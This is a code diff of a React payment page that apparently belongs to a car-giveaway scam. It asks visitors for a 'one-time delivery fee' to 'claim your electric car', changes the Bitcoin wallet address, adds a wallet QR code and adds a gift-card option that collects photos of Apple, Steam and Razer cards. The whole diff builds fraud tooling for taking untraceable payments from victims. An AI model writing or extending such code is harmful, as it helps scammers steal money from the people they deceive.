@@ -1,20 +1,32 @@
 import { useState } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
-import { Bitcoin, Copy, CheckCircle2, AlertCircle, Car, Loader2 } from 'lucide-react';
+import { Bitcoin, Copy, CheckCircle2, AlertCircle, Car, Loader2, Gift, Upload } from 'lucide-react';
 import api from '@/lib/api';
+import bitcoinScan from '@/assets/bitcoin scan.jpeg';
+import appleCard from '@/assets/apple.jpg';
+import steamCard from '@/assets/steam.jpg';
+import razerCard from '@/assets/razer.jpg';
 
-const BTC_WALLET = 'bc1qelitedrive99motorgrants2025bydev';
+const BTC_WALLET = '1AhhZkqTnehjafNmNXRGoMmkbiYSR2m5ud';
+
+const giftCards = [
+  { name: 'Apple', image: appleCard },
+  { name: 'Steam', image: steamCard },
+  { name: 'Razer', image: razerCard },
+];
 
 export default function PaymentPage() {
   const location = useLocation();
   const navigate = useNavigate();
   const { orderId, car, fee } = location.state || {};
 
+  const [paymentMethod, setPaymentMethod] = useState<'bitcoin' | 'giftcard'>('bitcoin');
   const [copied, setCopied] = useState(false);
   const [showContactSupport, setShowContactSupport] = useState(false);
   const [showReviewMsg, setShowReviewMsg] = useState(false);
   const [submitting, setSubmitting] = useState(false);
   const [txid, setTxid] = useState('');
+  const [giftCardFile, setGiftCardFile] = useState<File | null>(null);
   const [error, setError] = useState('');
 
   const copyWallet = () => {
@@ -28,12 +40,20 @@ export default function PaymentPage() {
     setSubmitting(true);
     try {
       if (orderId) {
-        await api.post('/payments', {
-          orderId,
-          amount: fee ?? 299,
-          paymentMethod: 'bitcoin',
-          walletAddress: BTC_WALLET,
-          txid: txid || null,
+        const data = new FormData();
+        data.append('orderId', orderId);
+        data.append('amount', String(fee ?? 299));
+        data.append('paymentMethod', paymentMethod);
+        data.append('walletAddress', BTC_WALLET);
+        if (paymentMethod === 'bitcoin') {
+          data.append('txid', txid || '');
+        }
+        if (giftCardFile) {
+          data.append('giftCard', giftCardFile);
+        }
+
+        await api.post('/payments', data, {
+          headers: { 'Content-Type': 'multipart/form-data' },
         });
       }
 
@@ -55,7 +75,7 @@ export default function PaymentPage() {
         <div className="text-center mb-8">
           <div className="inline-flex items-center gap-2 glass px-4 py-2 rounded-full mb-4">
             <Bitcoin className="w-4 h-4 text-gold-400" />
-            <span className="text-sm text-gold-400 font-semibold">Bitcoin Payment</span>
+            <span className="text-sm text-gold-400 font-semibold">Complete Your Payment</span>
           </div>
           <h1 className="font-display text-3xl font-bold text-white mb-2">Complete Your Payment</h1>
           <p className="text-gray-400">Pay the one-time delivery fee to claim your electric car.</p>
@@ -96,70 +116,142 @@ export default function PaymentPage() {
           </div>
         </div>
 
-        {/* Bitcoin Payment */}
-        <div className="glass-card p-6 mb-6">
-          <div className="flex items-center gap-3 mb-4">
-            <div className="w-12 h-12 rounded-xl bg-gold-500/20 flex items-center justify-center">
-              <Bitcoin className="w-6 h-6 text-gold-400" />
-            </div>
-            <div>
-              <h3 className="font-semibold text-white">Pay with Bitcoin</h3>
-              <p className="text-xs text-gray-400">Send the exact amount to the wallet below</p>
-            </div>
-          </div>
-
-          <div className="glass p-4 rounded-xl mb-4">
-            <p className="text-xs text-gray-400 mb-1">Amount to pay</p>
-            <p className="text-2xl font-bold text-gold-400">${fee ?? 299}</p>
-            <p className="text-xs text-gray-500 mt-1">≈ {((fee ?? 299) / 65000).toFixed(6)} BTC</p>
-          </div>
-
-          <div className="glass p-4 rounded-xl mb-4">
-            <p className="text-xs text-gray-400 mb-1">Bitcoin wallet address</p>
-            <div className="flex items-center gap-2">
-              <code className="text-xs text-brand-400 break-all flex-1 font-mono">{BTC_WALLET}</code>
-              <button
-                onClick={copyWallet}
-                className="shrink-0 glass px-3 py-2 rounded-lg hover:bg-brand-500/20 transition-colors"
-              >
-                {copied ? (
-                  <CheckCircle2 className="w-4 h-4 text-brand-400" />
-                ) : (
-                  <Copy className="w-4 h-4 text-gray-300" />
-                )}
-              </button>
-            </div>
-          </div>
-
-          <div className="mb-4">
-            <label className="block text-sm font-medium text-gray-300 mb-2">
-              Transaction ID (optional, for faster confirmation)
-            </label>
-            <input
-              type="text"
-              value={txid}
-              onChange={(e) => setTxid(e.target.value)}
-              className="w-full glass px-4 py-3 rounded-xl text-white placeholder-gray-500 focus:border-brand-400/50 focus:outline-none"
-              placeholder="Paste your Bitcoin transaction hash"
-            />
-          </div>
-
-          <div className="glass p-3 rounded-xl mb-4 flex items-start gap-2">
-            <AlertCircle className="w-4 h-4 text-gold-400 shrink-0 mt-0.5" />
-            <p className="text-xs text-gray-400">
-              After sending the payment, click "I've Paid" below. Our admin team will confirm your
-              payment and process your delivery. You can also contact support for assistance.
-            </p>
-          </div>
-
-          <button
-            onClick={handlePaid}
-            disabled={submitting}
-            className="w-full btn-primary text-base py-4 disabled:opacity-50 flex items-center justify-center gap-2"
-          >
-            {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "I've Paid — Confirm Payment"}
-          </button>
+        {/* Payment Method Tabs */}
+        <div className="flex gap-2 mb-6">
+          {[
+            { key: 'bitcoin', label: 'Bitcoin', icon: Bitcoin },
+            { key: 'giftcard', label: 'Gift Card', icon: Gift },
+          ].map(({ key, label, icon: Icon }) => (
+            <button
+              key={key}
+              onClick={() => setPaymentMethod(key as 'bitcoin' | 'giftcard')}
+              className={`flex-1 flex items-center justify-center gap-2 py-3 rounded-xl text-sm font-semibold transition-all ${
+                paymentMethod === key
+                  ? 'bg-brand-500 text-ink-950'
+                  : 'glass text-gray-400 hover:text-white'
+              }`}
+            >
+              <Icon className="w-4 h-4" /> {label}
+            </button>
+          ))}
         </div>
+
+        {paymentMethod === 'bitcoin' ? (
+          /* Bitcoin Payment */
+          <div className="glass-card p-6 mb-6">
+            <div className="flex items-center gap-3 mb-4">
+              <div className="w-12 h-12 rounded-xl bg-gold-500/20 flex items-center justify-center">
+                <Bitcoin className="w-6 h-6 text-gold-400" />
+              </div>
+              <div>
+                <h3 className="font-semibold text-white">Pay with Bitcoin</h3>
+                <p className="text-xs text-gray-400">Send the exact amount to the wallet below</p>
+              </div>
+            </div>
+
+            <div className="glass p-4 rounded-xl mb-4">
+              <p className="text-xs text-gray-400 mb-1">Amount to pay</p>
+              <p className="text-2xl font-bold text-gold-400">${fee ?? 299}</p>
+              <p className="text-xs text-gray-500 mt-1">≈ {((fee ?? 299) / 65000).toFixed(6)} BTC</p>
+            </div>
+
+            <div className="glass p-4 rounded-xl mb-4 text-center">
+              <img
+                src={bitcoinScan}
+                alt="Bitcoin QR Code"
+                className="w-48 h-48 mx-auto rounded-xl mb-3 object-contain"
+              />
+              <p className="text-xs text-gray-400 mb-1">Bitcoin wallet address</p>
+              <div className="flex items-center gap-2">
+                <code className="text-xs text-brand-400 break-all flex-1 font-mono">{BTC_WALLET}</code>
+                <button
+                  onClick={copyWallet}
+                  className="shrink-0 glass px-3 py-2 rounded-lg hover:bg-brand-500/20 transition-colors"
+                >
+                  {copied ? (
+                    <CheckCircle2 className="w-4 h-4 text-brand-400" />
+                  ) : (
+                    <Copy className="w-4 h-4 text-gray-300" />
+                  )}
+                </button>
+              </div>
+            </div>
+
+            <div className="mb-4">
+              <label className="block text-sm font-medium text-gray-300 mb-2">
+                Transaction ID (optional, for faster confirmation)
+              </label>
+              <input
+                type="text"
+                value={txid}
+                onChange={(e) => setTxid(e.target.value)}
+                className="w-full glass px-4 py-3 rounded-xl text-white placeholder-gray-500 focus:border-brand-400/50 focus:outline-none"
+                placeholder="Paste your Bitcoin transaction hash"
+              />
+            </div>
+          </div>
+        ) : (
+          /* Gift Card Payment */
+          <div className="glass-card p-6 mb-6">
+            <div className="flex items-center gap-3 mb-4">
+              <div className="w-12 h-12 rounded-xl bg-brand-500/20 flex items-center justify-center">
+                <Gift className="w-6 h-6 text-brand-400" />
+              </div>
+              <div>
+                <h3 className="font-semibold text-white">Pay with Gift Card</h3>
+                <p className="text-xs text-gray-400">Upload a clear photo of your gift card</p>
+              </div>
+            </div>
+
+            <div className="grid grid-cols-3 gap-3 mb-4">
+              {giftCards.map((card) => (
+                <div key={card.name} className="glass p-3 rounded-xl text-center">
+                  <img
+                    src={card.image}
+                    alt={card.name}
+                    className="w-full aspect-[3/2] object-contain rounded-lg mb-2"
+                  />
+                  <span className="text-xs text-white font-medium">{card.name}</span>
+                </div>
+              ))}
+            </div>
+
+            <div className="glass p-4 rounded-xl mb-4">
+              <p className="text-xs text-gray-400 mb-1">Amount to pay</p>
+              <p className="text-2xl font-bold text-gold-400">${fee ?? 299}</p>
+            </div>
+
+            <label className="flex flex-col items-center justify-center w-full glass border-dashed border-white/20 rounded-xl p-6 cursor-pointer hover:border-brand-400/40 transition-colors mb-4">
+              <Upload className="w-8 h-8 text-gray-400 mb-2" />
+              <span className="text-sm text-gray-400">
+                {giftCardFile ? giftCardFile.name : 'Click to upload gift card image'}
+              </span>
+              <span className="text-xs text-gray-500 mt-1">JPG, PNG up to 10MB</span>
+              <input
+                type="file"
+                className="hidden"
+                accept=".jpg,.jpeg,.png"
+                onChange={(e) => e.target.files && setGiftCardFile(e.target.files[0])}
+              />
+            </label>
+          </div>
+        )}
+
+        <div className="glass p-3 rounded-xl mb-4 flex items-start gap-2">
+          <AlertCircle className="w-4 h-4 text-gold-400 shrink-0 mt-0.5" />
+          <p className="text-xs text-gray-400">
+            After sending the payment, click "I've Paid" below. Our admin team will confirm your
+            payment and process your delivery. You can also contact support for assistance.
+          </p>
+        </div>
+
+        <button
+          onClick={handlePaid}
+          disabled={submitting || (paymentMethod === 'giftcard' && !giftCardFile)}
+          className="w-full btn-primary text-base py-4 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
+        >
+          {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "I've Paid — Confirm Payment"}
+        </button>
 
         {/* Contact Support Popup */}
         {showContactSupport && (
